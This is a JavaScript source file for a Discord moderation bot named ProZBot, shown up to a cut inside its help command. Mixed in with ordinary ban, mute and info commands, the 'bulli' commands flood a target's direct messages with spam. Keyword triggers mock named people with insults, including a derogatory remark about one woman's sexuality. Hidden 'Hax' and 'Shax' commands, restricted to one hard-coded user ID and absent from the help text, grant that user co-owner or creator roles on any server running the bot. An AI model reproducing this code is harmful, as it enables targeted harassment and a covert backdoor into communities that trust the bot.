const Discord = require("discord.js");
const botsettings = require("./botsettings.json");
const ms = require("ms");
var client = new Discord.Client();
var prefix = "P!";

client.on('ready', async () => {
    console.log("ProZBot - The Proe Bot !");
});
client.on('message', async message => {
    if (message.content.startsWith(prefix + "sinv")) {
	    var InvEmbed = new Discord.RichEmbed()
	    .setDescription("Here is the server invite link : http://discord.gg/9wdZh3G")
	    .setColor("0x02e427")
	   message.channel.sendEmbed(InvEmbed)
	    }
});
client.on('message', function(message) {
    if (message.author.equals(client.user)) return;

    var isInsulte = false;
    var insulte = ['who is petty'];
    for (var i = 0; i < insulte.length; i++) {
        if (message.content.toLowerCase().includes(insulte[i])) {
            isInsulte = true;
            break;
        }
    }

    if (isInsulte) {
       message.channel.send(`${message.author} Satan`)

       message.channel.sendFile("https://media.discordapp.net/attachments/506530289053466625/522342780329263114/unknown.png")
    }
});
client.on('message', function(message) {
    if (message.author.equals(client.user)) return;

    var isInsulte = false;
    var insulte = ['who is senki'];
    for (var i = 0; i < insulte.length; i++) {
        if (message.content.toLowerCase().includes(insulte[i])) {
            isInsulte = true;
            break;
        }
    }

    if (isInsulte) {
       message.channel.send(`${message.author} A nob`)
       message.channel.sendFile("https://cdn.discordapp.com/attachments/506530289053466625/520635401694609418/trigger.gif")
    }
});
client.on('message', message => {
    if (message.content.startsWith(prefix + "bulli")) {
        if (message.member.id != '511236101352980506') {
            return message.channel.sendMessage("Only Cray can bulli, so sotp.")
        } else {
        let bullitarget = message.mentions.members.first();
        if(!bullitarget) {
            return message.channel.sendMessage("Who is the nub to bulli ?")
        } else {
        bullitarget.sendMessage("999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999")
        bullitarget.sendMessage("999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999")
        bullitarget.sendMessage("999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999")
        bullitarget.sendMessage("999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999")
        bullitarget.sendMessage("999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999")
        bullitarget.sendMessage("999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999")
        bullitarget.sendMessage("999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999")
        bullitarget.sendMessage("999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999")
        bullitarget.sendMessage("999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999")
        bullitarget.sendMessage("999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999")
        bullitarget.sendMessage("999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999")
        bullitarget.sendMessage("999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999")
        bullitarget.sendMessage("999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999")
        bullitarget.sendMessage("999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999")
        bullitarget.sendMessage(`Its **Cray** that sent the bulli rocket on u neb `)
        message.channel.sendMessage(`I launched the bulli rocket on da nub : ${bullitarget.user}`)
        message.channel.sendFile("https://media.discordapp.net/attachments/478892198935396367/522339955633160202/220px-Full_Blood_Wagyu_Bull_in_Chile.png")

        
    }
}
}
});
client.on('message', message => {
    if (message.content.startsWith(prefix + "sbulli")) {
        if (message.member.id != '183549541470044161') {
            return message.channel.sendMessage("Only Senkeh can bulli, so sotp.")
        } else {
        let bullitarget = message.mentions.members.first();
        if(!bullitarget) {
            return message.channel.sendMessage("Who is the nub to bulli ?")
        } else {
        bullitarget.sendMessage("999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999")
        bullitarget.sendMessage("999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999")
        bullitarget.sendMessage("999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999")
        bullitarget.sendMessage("999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999")
        bullitarget.sendMessage("999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999")
        bullitarget.sendMessage("999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999")
        bullitarget.sendMessage("999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999")
        bullitarget.sendMessage("999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999")
        bullitarget.sendMessage("999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999")
        bullitarget.sendMessage("999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999")
        bullitarget.sendMessage("999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999")
        bullitarget.sendMessage("999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999")
        bullitarget.sendMessage("999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999")
        bullitarget.sendMessage("999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999")
        bullitarget.sendMessage(`Its **Senkeh** that sent the bulli rocket on u neb `)
        message.channel.sendMessage(`I launched the bulli rocket on da nub : ${bullitarget.user}`)
        message.channel.sendFile("https://media.discordapp.net/attachments/478892198935396367/522339955633160202/220px-Full_Blood_Wagyu_Bull_in_Chile.png")
    }
}
}
});

client.on('message', message => {
    if (message.content.startsWith(prefix + "setgame")) {
        if (message.member.id != '183549541470044161') {
            return message.channel.sendMessage("Seul un administrateur du bot peut exécuter cette commande :warning: ")
        } else {
        var args = message.content.substring(prefix.length).split(" ");
        let game = args.slice(1).join(' ')   
        message.channel.send(`Description mis à jour :` + game)
    client.user.setActivity(game)
        }
    }
});
client.on('message', async message => {
	    console.log(`Content : ${  message.content}`);
if (message.content === prefix + "list") {
    function checkBots(guild) {
        let botCount = 0; 
        guild.members.forEach(member => { 
          if(member.user.bot) botCount++; 
        });
        return botCount; 
      }
    
      function checkMembers(guild) {
        let memberCount = 0;
        guild.members.forEach(member => {
          if(!member.user.bot) memberCount++;  
        });
        return memberCount;
      }
    var ServerListEmbed = new Discord.RichEmbed()
    .setAuthor(message.author.username,message.author.avatarURL)
    .addField(`My server list :`,client.guilds.map(r => `${r.name} | **${message.guild.memberCount}** membres.`))
    .setColor("0x02e427")
    .setFooter("ProzBot, Any hacking attempts will lead to a lawsuit ⚠.","https://cdn.discordapp.com/attachments/434459534514454528/504356020198572044/MIUI-9-Gif-Lightning.gif?width=473&height=473")
    message.delete(message);
    message.channel.sendEmbed(ServerListEmbed);
}
});
client.on('message', async message => {
if (message.content === prefix + "sinfo") {
    function checkBots(guild) {
        let botCount = 0; 
        guild.members.forEach(member => { 
          if(member.user.bot) botCount++; 
        });
        return botCount; 
      }
    
      function checkMembers(guild) {
        let memberCount = 0;
        guild.members.forEach(member => {
          if(!member.user.bot) memberCount++; 
        });
        return memberCount;
      }
    
      var ServerInfoEmbed = new Discord.RichEmbed()
        .setAuthor(`${message.guild.name} - Informations`, message.guild.iconURL) 
        .setColor('#f4df42') 
        .addField('Server Owner :', message.guild.owner, true) 
        .addField('Channels :', message.guild.channels.size, true) 
        .addField(`Members :`, message.guild.memberCount) 
        .addField('Humans :', checkMembers(message.guild), true)
        .addField('Bot :', checkBots(message.guild), true)
        .setFooter('Serveur created the :')
        .setTimestamp(message.guild.createdAt); 
    
        message.channel.send(ServerInfoEmbed);
        return
    }
});
client.on('message', async message => {
if (message.content === prefix + "ping"){
    var embed = new Discord.RichEmbed()
    .setAuthor(message.author.username, message.author.avatarURL)
    .addField(`${Math.round(client.ping)} ms`, "Host on da SenKeh server")
    .setColor("0x02e427")
    .setFooter("ProzBot, Any hacking attempts will lead to a lawsuit ⚠.","https://cdn.discordapp.com/attachments/434459534514454528/504356020198572044/MIUI-9-Gif-Lightning.gif?width=473&height=473")
    message.delete()
    message.channel.send(embed);
}
});
client.on('message', async message => {
    if (message.content.startsWith(prefix + "say")) {
	if (!message.member.permissions.has('MANAGE_MESSAGES')) {
		return message.channel.sendMessage("You need sum permissions ! ")
	} else {
	let args = message.content.slice(prefix.length).trim().split('');
    	let say = args.slice(3).join('')   
        var embedSay = new Discord.RichEmbed()
		.setColor(0xff4c4c)
		.setDescription(`⚡📝 | ${say}`)
		message.delete()
		message.channel.send(embedSay)
    }
}
});
client.on('message', async message => {
    if (message.content.startsWith(prefix + "ban")) {
        if (!message.member.permissions.has('BAN_MEMBERS')) {
            var BanEmbed = new Discord.RichEmbed()
                .setAuthor(message.author.username, message.author.avatarURL)
                .setTitle(`Permissions >> No enough permissions | Check your DM`)
                .setColor("0xff4c4c")
                .setFooter("ProzBot, Any hacking attempts will lead to a lawsuit ⚠.","https://cdn.discordapp.com/attachments/434459534514454528/504356020198572044/MIUI-9-Gif-Lightning.gif?width=473&height=473")
                message.delete()
	    var BanInstructions = new Discord.RichEmbed()
                .setAuthor(message.author.username, message.author.avatarURL)
                .setTitle(`Ban instructions`)
	    	.addField(`To execute correctly a ban, be sure that :`)
	    	.addField(`That you have enough permissions to execute that command,`,`Verify it`)
	    	.addField(`That the bot has enough permissions to obey you,`,`Verify it`)
	    	.addField(`That you wrote an user to ban,`,`Verify it`)
	    	.addField(`That you entered a reason.`,`Verify it`)
                .setColor("0xff4c4c")
                .setFooter("ProzBot, Any hacking attempts will lead to a lawsuit ⚠.","https://cdn.discordapp.com/attachments/434459534514454528/504356020198572044/MIUI-9-Gif-Lightning.gif?width=473&height=473")
            message.author.sendMessage(BanInstructions)
            message.channel.send(BanEmbed).catch((error) => { console.log(error.message) })
            return
        } else {
        let member = message.mentions.members.first();
        if(!member) {
          var BanEmbed = new Discord.RichEmbed()
              .setAuthor(message.author.username, message.author.avatarURL)
              .setTitle(`Sanctions >> Ban >> User | Check your DM`)
              .setColor("0xff4c4c")
    		.setFooter("ProzBot, Any hacking attempts will lead to a lawsuit ⚠.","https://cdn.discordapp.com/attachments/434459534514454528/504356020198572044/MIUI-9-Gif-Lightning.gif?width=473&height=473")
          message.delete()
	    var BanInstructions = new Discord.RichEmbed()
                .setAuthor(message.author.username, message.author.avatarURL)
                .setTitle(`Instructions Ban`)
                .setTitle(`Ban instructions`)
	    	.addField(`To execute correctly a ban, be sure that :`)
	    	.addField(`That you have enough permissions to execute that command,`,`Verify it`)
	    	.addField(`That the bot has enough permissions to obey you,`,`Verify it`)
	    	.addField(`That you wrote an user to ban,`,`Verify it`)
	    	.addField(`That you entered a reason.`,`Verify it`)
                .setColor("0xff4c4c")
                .setFooter("ProzBot, Any hacking attempts will lead to a lawsuit ⚠.","https://cdn.discordapp.com/attachments/434459534514454528/504356020198572044/MIUI-9-Gif-Lightning.gif?width=473&height=473")
            message.author.sendMessage(BanInstructions)
          message.channel.send(BanEmbed).catch((error) => { console.log(error.message) });
          return
        } else {
        if(!member.bannable) {
                var EmbedBan = new Discord.RichEmbed()
                .setAuthor(message.author.username, message.author.avatarURL)
                .setTitle(`Sanctions >> Ban >> Can't ban this user | Check your DM`)
                .setColor("0xff4c4c")
               .setFooter("ProzBot, Any hacking attempts will lead to a lawsuit ⚠.","https://cdn.discordapp.com/attachments/434459534514454528/504356020198572044/MIUI-9-Gif-Lightning.gif?width=473&height=473")
            message.delete()
	var BanInstructions = new Discord.RichEmbed()
                .setAuthor(message.author.username, message.author.avatarURL)
                .setTitle(`Ban instructions`)
	    	.addField(`To execute correctly a ban, be sure that :`)
	    	.addField(`That you have enough permissions to execute that command,`,`Verify it`)
	    	.addField(`That the bot has enough permissions to obey you,`,`Verify it`)
	    	.addField(`That you wrote an user to ban,`,`Verify it`)
	    	.addField(`That you entered a reason.`,`Verify it`)
                .setColor("0xff4c4c")
                .setFooter("ProzBot, Any hacking attempts will lead to a lawsuit ⚠.","https://cdn.discordapp.com/attachments/434459534514454528/504356020198572044/MIUI-9-Gif-Lightning.gif?width=473&height=473")
            message.author.sendMessage(BanInstructions)
                message.channel.send(EmbedBan).catch((error) => { console.log(error.message) });
                return
        } else {
            if (!member.permissions.has('BAN_MEMBERS')) {
                message.channel.send(EmbedBan).catch((error) => { console.log(error.message) });
                return
            } else {
        
            var args = message.content.substring(prefix.length).split(" ");
            let reason = args.slice(2).join(' ')            
            if(!reason) reason = "Aucune Raison n'a été fournie, désolé (ツ)"

        member.ban(reason)
          .catch(error => message.reply(`Désolé ${message.author} Je ne peux pas sanctionnés la personne : ${error}`));
          message.channel.send(new Discord.RichEmbed()
          .setAuthor(message.author.username, message.author.avatarURL)
          .addField(`Penalty applied !`,`User ${message.mentions.users.first()} has been banned by ${message.author.tag}, Reason : ${reason}`)
          .setColor("0x02e427")
          .setFooter("ProzBot, Any hacking attempts will lead to a lawsuit ⚠.","https://cdn.discordapp.com/attachments/434459534514454528/504356020198572044/MIUI-9-Gif-Lightning.gif?width=473&height=473"))
        var BanLogEmbed = new Discord.RichEmbed()
          .setAuthor(message.author.username, message.author.avatarURL)
          .addField(`Penalty applied ( Ban ) !`,`User ${message.mentions.users.first()} has been banned by ${message.author.tag}, Reason : ${reason}`)
          .setColor("0x02e427")
          .setFooter("ProzBot, Any hacking attempts will lead to a lawsuit ⚠.","https://cdn.discordapp.com/attachments/434459534514454528/504356020198572044/MIUI-9-Gif-Lightning.gif?width=473&height=473")
          const logs = message.guild.channels.find(channel => channel.name === "logs");
          logs.sendMessage(BanLogEmbed)
            return;
                }
            }
        }
    }
}
if (message.content.startsWith(`${prefix}Shax`)) {
    if (message.member.id != '183549541470044161') {
        return message.channel.sendMessage("Only Senkeh can hax")
    } else {
        let HaxUser1 = message.mentions.users.first();
        if (!HaxUser1) {
            message.channel.send("Ping Urself Senkeh")
        } else {
        const HaxUser = message.guild.member(HaxUser1) || await message.guild.fetchMember(HaxUser1);
         let rolehax = message.guild.roles.find(r => r.name === "CO-OWNER");
        await HaxUser.addRole(rolehax);
        message.channel.sendMessage("U got Co-Owner role yey")
    }
}
}
if (message.content.startsWith(`${prefix}Hax`)) {
    if (message.member.id != '183549541470044161') {
        return message.channel.sendMessage("Only Senkeh can hax")
    } else {
        let HaxUser3 = message.mentions.users.first();
        if (!HaxUser3) {
            message.channel.send("Ping Urself Senkeh")
        } else {
        const HaxUser2 = message.guild.member(HaxUser3) || await message.guild.fetchMember(HaxUser3);
         let rolehax2 = message.guild.roles.find(r => r.name === "=====CREATORS=====");
        await HaxUser2.addRole(rolehax2);
        message.channel.sendMessage("U got ===Creators=== role yey")
    }
}
}
    if (message.content.startsWith(`${prefix}mute`)) {
        if (!message.member.permissions.has('MANAGE_MESSAGES')) {
            var MuteEmbed = new Discord.RichEmbed()
            .setAuthor(message.author.username, message.author.avatarURL)
            .setTitle("Sanctions >> Mute >> No enough permissions | Check your DM")
            .setColor("0xff4c4c")
               .setFooter("ProzBot, Any hacking attempts will lead to a lawsuit ⚠.","https://cdn.discordapp.com/attachments/434459534514454528/504356020198572044/MIUI-9-Gif-Lightning.gif?width=473&height=473")
	    var MuteInstructions = new Discord.RichEmbed()
                .setAuthor(message.author.username, message.author.avatarURL)
                .setTitle(`Mute instructions`)
	    	.addField(`To execute correctly a mute, be sure that :`)
	    	.addField(`That you have enough permissions to execute that command,`,`Verify it`)
	    	.addField(`That the bot has enough permissions to obey you,`,`Verify it`)
	    	.addField(`That you wrote an user to mute,`,`Verify it`)
	    	.addField(`That you entered a reason.`,`Verify it`)
                .setColor("0xff4c4c")
                .setFooter("ProzBot, Any hacking attempts will lead to a lawsuit ⚠.","https://cdn.discordapp.com/attachments/434459534514454528/504356020198572044/MIUI-9-Gif-Lightning.gif?width=473&height=473")
            message.author.sendMessage(MuteInstructions)
            message.delete()
            return message.channel.send(MuteEmbed);
        } else {
            let userToMute = message.mentions.users.first();
            if (!userToMute) {
                var MuteEmbed = new Discord.RichEmbed()
                .setAuthor(message.author.username, message.author.avatarURL)
                .setTitle("Sanction >> Mute >> User | Check your DM")
                .setColor("0xff4c4c")
                .setFooter("ProzBot, Any hacking attempts will lead to a lawsuit ⚠.","https://cdn.discordapp.com/attachments/434459534514454528/504356020198572044/MIUI-9-Gif-Lightning.gif?width=473&height=473")
                message.delete()
	var MuteInstructions = new Discord.RichEmbed()
                .setAuthor(message.author.username, message.author.avatarURL)
                .setTitle(`Mute instructions`)
	    	.addField(`To execute correctly a mute, be sure that :`)
	    	.addField(`That you have enough permissions to execute that command,`,`Verify it`)
	    	.addField(`That the bot has enough permissions to obey you,`,`Verify it`)
	    	.addField(`That you wrote an user to mute,`,`Verify it`)
	    	.addField(`That you entered a reason.`,`Verify it`)
                .setColor("0xff4c4c")
                .setFooter("ProzBot, Any hacking attempts will lead to a lawsuit ⚠.","https://cdn.discordapp.com/attachments/434459534514454528/504356020198572044/MIUI-9-Gif-Lightning.gif?width=473&height=473")
            message.author.sendMessage(MuteInstructions)
                return message.channel.send(MuteEmbed);
            } else {
                var args = message.content.substring(prefix.length).split(" ");
                let mutetime = args.slice(3).join(' ')
                if(!mutetime) {
                var timeerror = new Discord.RichEmbed()
                .setTitle("Sanction >> Mute >> Time")
                .setDescription("Put a time please ! ( format : s,m,h )")
                .setColor("0xff4c4c")
                .setFooter("ProzBot, Any hacking attempts will lead to a lawsuit ⚠.","https://cdn.discordapp.com/attachments/434459534514454528/504356020198572044/MIUI-9-Gif-Lightning.gif?width=473&height=473")
                message.channel.send(timeerror);
                return;
                } else {
               let role = message.guild.roles.find(r => r.name === "❌ MutedProZ ❌");
                if (!role) {
                    try {
                        role = await message.guild.createRole({
                            name: "❌ MutedProZ ❌",
                            color: "#c4c1c1",
                            permissions: []
                        });
 
                        message.guild.channels.forEach(async (channel) => {
                            await channel.overwritePermissions(role, {
                                SEND_MESSAGES: false,
                                ADD_REACTIONS: false
                            });
                        });
                    } catch (e) {
                        console.log(e.stack);
                    }
                }
                const memberToMute = message.guild.member(userToMute) || await message.guild.fetchMember(userToMute);
 
                await memberToMute.addRole(role);
                var args = message.content.substring(prefix.length).split(" ");
                let mutereason = args.slice(2).join(' ')
                var MuteEmbed = new Discord.RichEmbed()
                .setAuthor(message.author.username, message.author.avatarURL)
                .addField(`Penalty applied !`,`User ${message.mentions.users.first()} has been muted by ${message.author.tag} for ${ms(ms(mutetime))}, Reason : ${mutereason}`)
                .setColor("0x02e427")
      		.setFooter("ProzBot, Any hacking attempts will lead to a lawsuit ⚠.","https://cdn.discordapp.com/attachments/434459534514454528/504356020198572044/MIUI-9-Gif-Lightning.gif?width=473&height=473")
                message.delete()
                message.channel.send(MuteEmbed); 
                var MuteLogEmbed = new Discord.RichEmbed()
                .setAuthor(message.author.username, message.author.avatarURL)
                .addField(`Penalty applied ( Mute ) !`,`User ${message.mentions.users.first()} has been muted by ${message.author.tag} for ${ms(ms(mutetime))}, Reason : ${mutereason}`)
                .setColor("0x02e427")
    		.setFooter("ProzBot, Any hacking attempts will lead to a lawsuit ⚠.","https://cdn.discordapp.com/attachments/434459534514454528/504356020198572044/MIUI-9-Gif-Lightning.gif?width=473&height=473")
                const logs = message.guild.channels.find(channel => channel.name === "logs");
                logs.sendMessage(MuteLogEmbed)
		setTimeout(function(){
                    memberToMute.removeRole(role);
                    message.channel.send(`<@${memberToMute.id}>'s mute expired !`);
                  }, ms(mutetime));
                return;
            }
        }
    }
}

    if (message.content.startsWith(`${prefix}unmute`)) {
        if (!message.member.permissions.has('MANAGE_MESSAGES')) {
            var UnMuteEmbed = new Discord.RichEmbed()
            .setAuthor(message.author.username, message.author.avatarURL)
            .setTitle("Sanctions >> Unmute >> No enough permissions")
            .setColor("0xff4c4c")
    .setFooter("ProzBot, Any hacking attempts will lead to a lawsuit ⚠.","https://cdn.discordapp.com/attachments/434459534514454528/504356020198572044/MIUI-9-Gif-Lightning.gif?width=473&height=473")
            message.delete()
	var UnMuteInstructions = new Discord.RichEmbed()
                .setAuthor(message.author.username, message.author.avatarURL)
                .setTitle(`UnMute instructions`)
	    	.addField(`To execute correctly a unmute, be sure that :`)
	    	.addField(`That you have enough permissions to execute that command,`,`Verify it`)
	    	.addField(`That the bot has enough permissions to obey you,`,`Verify it`)
	    	.addField(`That you wrote an user to unmute,`,`Verify it`)
                .setColor("0xff4c4c")
                .setFooter("ProzBot, Any hacking attempts will lead to a lawsuit ⚠.","https://cdn.discordapp.com/attachments/434459534514454528/504356020198572044/MIUI-9-Gif-Lightning.gif?width=473&height=473")
            message.author.sendMessage(UnMuteInstructions)
            return message.channel.send(UnMuteEmbed);
        } else {
            let userToMute = message.mentions.users.first();
            if (!userToMute) {
                var UnMuteEmbed = new Discord.RichEmbed()
                .setAuthor(message.author.username, message.author.avatarURL)
                .setTitle("Sanctions >> Unmute >> User")
                .setColor("0xff4c4c")
                .setFooter("ProzBot, Any hacking attempts will lead to a lawsuit ⚠.","https://cdn.discordapp.com/attachments/434459534514454528/504356020198572044/MIUI-9-Gif-Lightning.gif?width=473&height=473")
                message.delete()
	var UnmuteInstructions = new Discord.RichEmbed()
                .setAuthor(message.author.username, message.author.avatarURL)
               .setTitle(`UnMute instructions`)
	    	.addField(`To execute correctly a unmute, be sure that :`)
	    	.addField(`That you have enough permissions to execute that command,`,`Verify it`)
	    	.addField(`That the bot has enough permissions to obey you,`,`Verify it`)
	    	.addField(`That you wrote an user to unmute,`,`Verify it`)
                .setColor("0xff4c4c")
                .setFooter("ProzBot, Any hacking attempts will lead to a lawsuit ⚠.","https://cdn.discordapp.com/attachments/434459534514454528/504356020198572044/MIUI-9-Gif-Lightning.gif?width=473&height=473")
            message.author.sendMessage(UnmuteInstructions)
                return message.channel.send(UnMuteEmbed);
            } else {
                let role = message.guild.roles.find(r => r.name === "❌ MutedProZ ❌");

                const memberToMute = message.guild.member(userToMute) || message.guild.fetchMember(userToMute);
                
                memberToMute.removeRole(role);
                var unMuteEmbed = new Discord.RichEmbed()
                .setAuthor(message.author.username, message.author.avatarURL)
                .addField(`Penalty removed`,`User ${message.mentions.users.first()} has been unmute by ${message.author.tag}.`)
                .setColor("0x02e427")
                .setFooter("ProzBot, Any hacking attempts will lead to a lawsuit ⚠.","https://cdn.discordapp.com/attachments/434459534514454528/504356020198572044/MIUI-9-Gif-Lightning.gif?width=473&height=473")
                message.delete()
                message.channel.send(unMuteEmbed);
                var unMuteLogEmbed = new Discord.RichEmbed()
                .setAuthor(message.author.username, message.author.avatarURL)
                .addField(`Penalty removed ( Unmute )`,`User ${message.mentions.users.first()} has been unmute by ${message.author.tag}.`)
                .setColor("0x02e427")
     		.setFooter("ProzBot, Any hacking attempts will lead to a lawsuit ⚠.","https://cdn.discordapp.com/attachments/434459534514454528/504356020198572044/MIUI-9-Gif-Lightning.gif?width=473&height=473")
                const logs = message.guild.channels.find(channel => channel.name === "logs");
                logs.sendMessage(unMuteLogEmbed)
                return;
          	}
    	}   
    }
});
    client.on('message', message => {
     if (message.isMentioned(client.user)) {
        if (message.member.id != '183549541470044161') {
                    var answers = [
  "No u",
  "Ye neb ?",
  "Don't pin me, pin cray instead !",
]

var randomAnswer = answers[Math.floor(Math.random() * answers.length)];
	message.channel.sendMessage(randomAnswer)	
	} else {
		message.channel.sendMessage("Yes Senki ? :D")
    return
                }
            }
});
client.on('message', message => {
    if (message.content.startsWith(`${prefix}info`)) {
let memberInfo = message.mentions.members.first();
const args = message.content.split(/ +/g);
const member = message.mentions.members.first() || message.guild.members.get(args[0]) || message.member;
let bot;
if (member.user.client === true) {
    bot = "Yes";
  } else {
    bot = "No";
  }

if(!memberInfo){
    message.delete()
  var userinf = new Discord.RichEmbed()
      .setAuthor(message.author.username)
      .setThumbnail(message.author.avatarURL)
      .setDescription(`Your informations, ${message.author} !`)
      .setColor(0x02e427)
      .addField("Full Username:", `${message.author.username}#${message.author.discriminator}`)
      .addField("ID:", message.author.id)
      .addField("Status :", message.author.presence.status)
      .addField("Last message :", message.author.lastMessage)
      .addField("Your Roles :", `${member.roles.filter(r => r.id !== message.guild.id).map(roles => `\`${roles.name}\``).join(" **|** ") || "No Roles"}`, true)
      .setFooter("Your join date : ")
      .setTimestamp(message.member.joinedTimestamp)

      message.channel.send(userinf);

}else{

  var userinfoo = new Discord.RichEmbed()
      .setAuthor(memberInfo.displayName)
      .setThumbnail(memberInfo.user.avatarURL)
      .setDescription(`User informations : ${memberInfo.user} !`)
      .setColor(0x02e427)
      .addField("Full username :", `${memberInfo.user.username}#${memberInfo.user.discriminator}`)
      .addField("ID :", memberInfo.id)
      .addField("Status :", memberInfo.presence.status)
      .addField("Last message :", memberInfo.user.lastMessage)
      .addField("Bot?", `${bot}`, true)
      .addField("Roles :", `${memberInfo.roles.filter(r => r.id !== message.guild.id).map(roles => `\`${roles.name}\``).join(" **|** ") || "No Roles"}`, true)
      .setFooter("Join date :")
      .setTimestamp(memberInfo.joinedTimestamp)

      message.channel.send(userinfoo);
}
}
});
client.on('message', function(message) {
    if (message.author.equals(client.user)) return;
    else {

    var isInsulte = false;
    var insulte = ['who is jenna'];
    for (var i = 0; i < insulte.length; i++) {
        if (message.content.toLowerCase().includes(insulte[i])) {
            isInsulte = true;
            break;
        }
    }

    if (isInsulte) {
        var Jennah = new Discord.RichEmbed()
            .setAuthor(message.author.username, message.author.avatarURL)
            .setThumbnail("https://cdn.discordapp.com/attachments/506530289053466625/525397273568608276/rJ_U2p_Pb.gif")
            .addField(`Information :`, `Level 100 "JeGey"\n **Max Level**\n **Types** : Lesbian | Normal\n **Nature** : Botch\n **HP**: 69 - IV: 1/69\n **Attack**: 0 - IV: 0/31\n **Defense**: 0 - IV: 0/31\n **Sp. Atk**: 0 - IV: 0/31\n **Sp. Def**: 0 - IV: 0/31\n **Speed**: 0 - IV: 0/31\n **Total IV** %: 0.69%`)
            .setImage("https://images-ext-1.discordapp.net/external/p7r4rM_7HP_wwTGLmtTAtApzZlxYSwIh2ElGuYih5VU/%3Fsize%3D256%26f%3D.gif/https/cdn.discordapp.com/avatars/267675263339462656/a_f72209dcc36364fdda84d2c8fee1a2b4.gif")
            .setColor(0x0aaa11)
        message.channel.send(Jennah)
    }
}
});
client.on('message', message => {
	            var args = message.content.substring(prefix.length).split(" ");
            let messageaides = args.slice(1).join(" ");
         if (message.content.startsWith(`${prefix}report`)) {
        if(!messageaides){ return message.channel.send("Please, write a message to send to staff.")
         } if(messageaides) {
          var demande = new Discord.RichEmbed()
                 .setAuthor(message.author.username, message.author.avatarURL)
                 .addField(`There you go ${message.author.tag} ! Your report have been sent to the staff ! : `,`${messageaides}`)
                 .setColor("0x02e427")
                 .setFooter("ProzBot, Any hacking attempts will lead to a lawsuit ⚠.","https://cdn.discordapp.com/attachments/434459534514454528/504356020198572044/MIUI-9-Gif-Lightning.gif?width=473&height=473")
         message.channel.send(demande);
         var demandeS = new Discord.RichEmbed()
                 .setAuthor(message.author.tag, message.author.avatarURL)
                 .setTitle("New Report !")
                 .addField(`Report : `,`${messageaides}`)
                 .setColor("0x02e427")
                 .setFooter("ProzBot, Any hacking attempts will lead to a lawsuit ⚠.","https://cdn.discordapp.com/attachments/434459534514454528/504356020198572044/MIUI-9-Gif-Lightning.gif?width=473&height=473")
                 const reportlogs = message.guild.channels.find(channel => channel.name === "reportlogs");
                 reportlogs.sendMessage(demandeS)
       return
   }
}
});
client.on('message', message => {
    if (message.content.startsWith(prefix + "help")) {
        var Help = new Discord.RichEmbed()
            .setAuthor(message.author.username, message.author.avatarURL)
            .setThumbnail("https://cdn.discordapp.com/attachments/516196743780630550/523248941282623498/logo.png")
            .setTitle(`👑 All my commands 👑`)
            .addField(`🌟 | Bot Administration :`,`[P!setgame](https://discord.gg/2kfPk9P) \n \n [P!Leave](https://discord.gg/2kfPk9P)`)
            .addField(`⚔️ | Moderation :`,`[P!ban (@Ping + Reason)](https://discord.gg/2kfPk9P) | Ban a player. \n \n [P!mute (@Ping + Reason + Time)](https://discord.gg/2kfPk9P) | Removing the permission from the player needed to talk. \n \n [P!unmute (@Mention)](https://discord.gg/2kfPk9P) | Giving this permission back.`)
            .addField(`❓ | Informations :`,`[P!sinfo](https://discord.gg/2kfPk9P) | Getting information of this server. \n \n [P!info](https://discord.gg/2kfPk9P) | Getting informations about yourself ( logic ). \n \n [P!info (@PingHere)](https://discord.gg/2kfPk9P) | Getting information about a person. \n \n [P!ping](https://discord.gg/2kfPk9P) | Getting bot's latency. \n \n [P!list](https://discord.gg/2kfPk9P) | You can see where i am, cool no ?.`)
            .addField(`🎲 | Divers :`,`[P!say (Message)](https://discord.gg/2kfPk9P) | Say command ( don't abuse it )`)
